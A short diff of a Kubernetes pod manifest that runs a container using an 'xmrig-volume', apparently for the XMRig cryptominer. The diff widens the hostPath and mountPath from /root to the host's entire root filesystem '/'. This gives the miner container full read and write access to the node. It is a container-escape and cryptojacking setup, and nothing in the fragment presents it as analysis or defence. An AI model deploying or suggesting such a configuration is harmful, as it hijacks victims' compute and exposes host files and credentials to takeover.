@@ -17,8 +17,8 @@ spec:
     - piD3ceiver
     volumeMounts:
     - name: xmrig-volume
-      mountPath: /root/xmrig/build
+      mountPath: /
   volumes:
   - name: xmrig-volume
     hostPath:
-      path: /root/
+      path: /
